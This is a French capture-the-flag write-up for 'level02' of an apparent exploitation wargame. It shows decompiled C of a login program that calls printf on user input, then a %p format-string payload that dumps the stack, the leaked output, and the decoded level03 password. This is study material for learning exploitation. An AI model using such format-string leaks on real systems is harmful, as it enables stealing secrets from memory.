# level02 : format string (leak du .pass)

```c
int main(int argc, char **argv, char **envp)
{
    char var_78[0x64];
    char buf_1[0x30];
    char buf[0x40];

    memset(var_78, 0, 0x60);
    memset(buf_1, 0, 0x28);
    memset(buf, 0, 0x60);

    FILE *fp = fopen("/home/users/level03/.pass", "r");
    if (!fp) {
        fwrite("ERROR: failed to open password file\n", 1, 0x24, stderr);
        exit(1);
    }

    int rax = fread(buf_1, 1, 0x29, fp);
    buf_1[strcspn(buf_1, "\n")] = 0;
    if (rax != 0x29) {
        fwrite("ERROR: failed to read password file\n", 1, 0x24, stderr);
        exit(1);
    }
    fclose(fp);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");

    printf("--[ Username: ");
    fgets(var_78, 0x64, stdin);
    var_78[strcspn(var_78, "\n")] = 0;

    printf("--[ Password: ");
    fgets(buf, 0x64, stdin);
    buf[strcspn(buf, "\n")] = 0;

    puts("*****************************************");

    if (!strncmp(buf_1, buf, 0x29)) {
        printf("Greetings, %s!\n", var_78);
        system("/bin/sh");
        return 0;
    }

    printf(var_78);
    puts(" does not have access!");
    exit(1);
}
```

le pass de level03 est lu dans buf_1 (sur la stack), et `printf(var_78)` affiche le username sans format -> format string : on leak la stack avec des %p.

username = des %p pour dump la stack :

    %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

sortie (le .pass apparait dans les valeurs leakees) :

    0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x7025207025207025 ... (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 ...  does not have access!

chaque qword en little endian = 8 caracteres ASCII :

    0x756e505234376848  ->  Hh74RPnu
    0x45414a3561733951  ->  Q9sa5JAE
    0x377a7143574e6758  ->  XgNWCqz7
    0x354a35686e475873  ->  sXGnh5J5
    0x48336750664b394d  ->  M9KfPg3H

password de level03 :

    Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
